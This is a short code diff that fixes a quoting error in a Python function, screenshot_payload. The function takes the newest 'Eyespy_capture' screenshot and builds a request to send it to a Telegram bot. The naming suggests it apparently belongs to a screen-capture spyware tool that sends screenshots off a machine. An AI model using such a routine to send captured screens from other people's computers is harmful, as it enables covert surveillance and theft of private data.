@@ -5,7 +5,7 @@ import os
 
 def screenshot_payload(bot_token, chat_id, title, message):
   # Use latest screenshot
-  files = glob.glob(screenshots/Eyespy_capture_*.png")
+  files = glob.glob("screenshots/Eyespy_capture_*.png")
   latest_file = max(files, key=os.path.getmtime)
   url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
   caption = f"{title}\n\n{message}"
